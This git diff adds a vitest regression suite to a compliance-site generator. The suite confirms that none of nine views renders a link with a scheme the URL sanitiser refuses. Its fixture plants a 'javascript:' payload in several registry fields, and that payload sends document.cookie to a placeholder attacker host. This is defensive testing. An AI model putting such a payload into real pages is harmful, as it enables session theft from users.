@@ -391,3 +391,106 @@ describe('the vendored libraries are the versions that were pinned', () => {
     });
   });
 });
+
+/* Nothing renders a link the sanitiser would have refused.
+ *
+ * `safeUrl` existed and was applied at five of eleven places an href is
+ * assigned; the other six took the value straight from the registry. Every
+ * field involved is constrained to http(s) by the schema, so a *validated*
+ * program could not carry a `javascript:` URL — but `kilagen build site` is a
+ * documented way to build without validating, and the tool inventory comes
+ * from another repository whose schema is asserted by a test suite rather than
+ * at build time.
+ *
+ * This is a sweep rather than a check per call site, so adding a twelfth
+ * href cannot quietly escape it.
+ */
+import { describe as describeUrls, it as itUrls, expect as expectUrls, beforeEach as beforeEachUrls, vi as viUrls } from 'vitest';
+import { state as urlState } from '../modules/state.js';
+
+const HOSTILE = 'javascript:fetch("https://evil.example/"+document.cookie)';
+
+/* Built once, at module scope, and only emptied between tests. `nav.js`
+   resolves #main and #right when it is first imported, exactly as it does in
+   the browser — replacing the body would leave it holding detached elements,
+   and every view would then render into nothing. */
+document.body.innerHTML = '<div id="main"></div><div id="right"></div><nav id="app-nav"></nav><div id="tree"></div><input id="search">';
+
+describeUrls('no view renders a link to a scheme the guard refuses', () => {
+  beforeEachUrls(async () => {
+    ['main', 'right', 'tree'].forEach((id) => { document.getElementById(id).textContent = ''; });
+    location.hash = '';
+    viUrls.spyOn(console, 'error').mockImplementation(() => {});
+    globalThis.fetch = viUrls.fn(async () => ({ ok: true, status: 200, text: async () => '# Body' }));
+  });
+
+  function plant() {
+    /* One standard, one risk and one vendor, each carrying a hostile URL in
+       every field that reaches an href. */
+    const docs = {
+      'standards/std-x.md': {
+        path: 'standards/std-x.md', id: 'std-x', type: 'standard', title: 'Standard X',
+        status: 'active', owner: 'role-o', source_of_truth: HOSTILE,
+        requirements: [{ ref: '1.1', text: 'One', evidence: [{ name: 'A', url: HOSTILE, collected: '2026-01-01' }] }],
+      },
+      'risks/rsk-x.md': {
+        path: 'risks/rsk-x.md', id: 'rsk-x', type: 'risk', title: 'Risk X',
+        status: 'active', owner: 'role-o', severity: 'high', tracker: HOSTILE,
+      },
+      'gaps/2026/gap-x.md': {
+        path: 'gaps/2026/gap-x.md', id: 'gap-x', type: 'gap', title: 'Gap X',
+        owner: 'role-o', requirement: 'std-x#1.1', found: '2026-01-01', tracker: HOSTILE,
+      },
+      'vendors/vnd-x.md': {
+        path: 'vendors/vnd-x.md', id: 'vnd-x', type: 'vendor', title: 'Vendor X',
+        status: 'active', owner: 'role-o', vendor_name: 'X', tier: 'critical',
+        certifications: [{ name: 'ISO 27001', url: HOSTILE, verified: '2026-01-01' }],
+      },
+    };
+    Object.assign(urlState, {
+      types: [{ name: 'standard', prefix: 'std', folder: 'standards', dated: false },
+              { name: 'risk', prefix: 'rsk', folder: 'risks', dated: false },
+              { name: 'gap', prefix: 'gap', folder: 'gaps', dated: true },
+              { name: 'vendor', prefix: 'vnd', folder: 'vendors', dated: false }],
+      model: { domains: [], capabilities: [], systems: [], risk_taxonomy: {} },
+      coverage: { pci_dss: { 1: { coverage: 'mapped', requirements: ['std-x#1.1'], gaps: [], exceptions: [] } } },
+      requirements: { 'std-x#1.1': { standard: 'std-x', ref: '1.1', text: 'One', gaps: [], exceptions: [] } },
+      publish: { destinations: {}, defaults: {} }, schedule: [], frameworkAdrs: [],
+      frameworks: { pci_dss: { name: 'PCI DSS', resources: [{ name: 'Bad', url: HOSTILE }] } },
+      tools: { 'iam.idp': { updated: '2026-01-01', tools: [{ name: 'T', url: HOSTILE, license: 'proprietary', note: 'n' }] } },
+      collectors: {},
+      fmCache: docs,
+      idToPath: Object.fromEntries(Object.values(docs).map((d) => [d.id, d.path])),
+      allDocs: Object.values(docs).map((d) => ({ path: d.path, name: d.path.split('/').pop() })),
+      bodyCache: {}, expandedSections: {}, currentDoc: '', currentView: 'home',
+      config: { name: 'Hostile', repo: '', organization: null, frameworks: [{ id: 'pci_dss' }] },
+    });
+  }
+
+  const RENDERS = [
+    ['a standard', async () => (await import('../modules/views/doc.js')).navigateDoc('standards/std-x.md')],
+    ['a standard, evidence tab', async () => {
+      location.hash = 'doc/standards/std-x.md?tab=evidence';
+      return (await import('../modules/views/doc.js')).navigateDoc('standards/std-x.md');
+    }],
+    ['a risk', async () => (await import('../modules/views/doc.js')).navigateDoc('risks/rsk-x.md')],
+    ['a gap', async () => (await import('../modules/views/doc.js')).navigateDoc('gaps/2026/gap-x.md')],
+    ['a vendor', async () => (await import('../modules/views/doc.js')).navigateDoc('vendors/vnd-x.md')],
+    ['the evidence page', async () => (await import('../modules/views/evidence.js')).renderEvidenceLens()],
+    ['the audit pack', async () => (await import('../modules/views/audit.js')).renderAudit('pci_dss')],
+    ['a framework', async () => (await import('../modules/views/compliance.js')).renderCompliance('pci_dss')],
+    ['the tool inventory', async () => (await import('../modules/views/tools.js')).renderTools()],
+  ];
+
+  RENDERS.forEach(([name, render]) => {
+    itUrls(name, async () => {
+      plant();
+      await render();
+      const hrefs = [...document.querySelectorAll('a[href]')].map((a) => a.getAttribute('href'));
+      const bad = hrefs.filter((h) => !/^https?:\/\//i.test(h));
+      expectUrls(bad, `${name} rendered a link the guard should have refused`).toEqual([]);
+      // And the text is still shown, so guarding does not silently hide a fact.
+      expectUrls(document.getElementById('main').textContent.length).toBeGreaterThan(0);
+    });
+  });
+});
